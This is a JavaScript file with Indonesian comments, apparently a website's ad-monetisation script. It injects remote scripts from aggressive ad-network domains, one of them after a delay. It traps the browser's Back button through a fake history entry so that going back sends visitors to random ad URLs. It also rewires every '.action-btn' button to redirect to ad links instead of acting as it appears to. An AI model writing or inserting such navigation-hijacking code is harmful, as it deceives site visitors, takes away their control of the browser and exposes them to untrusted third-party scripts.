// // Iklan Pertama - langsung diload
// var s1 = document.createElement('script');
// s1.src = "//filingattenuate.com/78/eb/56/78eb564356465edb57c47d3471c27669.js";
// s1.type = "text/javascript";
// document.body.appendChild(s1);

// Buat elemen script baru
var s1 = document.createElement('script');

// Atur atribut-atribut yang dibutuhkan
s1.src = 'https://al5sm.com/tag.min.js';
s1.dataset.zone = '9443034';
s1.type = 'text/javascript'; // Opsional di HTML5, tapi praktik yang baik

// Tambahkan elemen script ke dalam <body>
document.body.appendChild(s1);


// Iklan Kedua - delay 5 detik
// setTimeout(function () {
//     var s2 = document.createElement('script');
//     s2.src = "https://groleegni.net/vignette.min.js";
//     s2.type = "text/javascript";
//     document.body.appendChild(s2);
// }, 1000);

// Tambahkan elemen script ke dalam <body>
document.body.appendChild(s1);
// Iklan Ketiga - delay 3 detik (agar urut)
setTimeout(function () {
    var s3 = document.createElement('script');
    s3.src = 'https://groleegni.net/vignette.min.js';
    s3.dataset.zone = '99823702';
    s3.type = 'text/javascript';
    document.body.appendChild(s3);
}, 2000);

// Redirect saat tombol Back ditekan
const redirectLinks = [
    "https://domesticrejoinedremark.com/rr7w4y66s?key=f5a3297e273e8f2b63d61b0d19b8d0a9",
    // "https://domesticrejoinedremark.com/xsv7f4118a?key=a12a22c36e35a402ee435cfb6c6db695",
    "https://otieu.com/4/8420178"
];
function getRandomLink() {
    const randomIndex = Math.floor(Math.random() * redirectLinks.length);
    return redirectLinks[randomIndex];
}
history.pushState(null, null, location.href);
window.addEventListener('popstate', function () {
    window.location.href = getRandomLink();
});

// Redirect saat tombol Action diklik
const adsbtnlink = [
    "https://domesticrejoinedremark.com/rr7w4y66s?key=f5a3297e273e8f2b63d61b0d19b8d0a9",
    "https://domesticrejoinedremark.com/xsv7f4118a?key=a12a22c36e35a402ee435cfb6c6db695",
    "https://otieu.com/4/8420178"
];
function getRandomLink1() {
    const randomIndex = Math.floor(Math.random() * adsbtnlink.length);
    return adsbtnlink[randomIndex];
}
document.querySelectorAll(".action-btn").forEach(btn => {
    btn.addEventListener("click", () => {
        window.location.href = getRandomLink1();
    });
});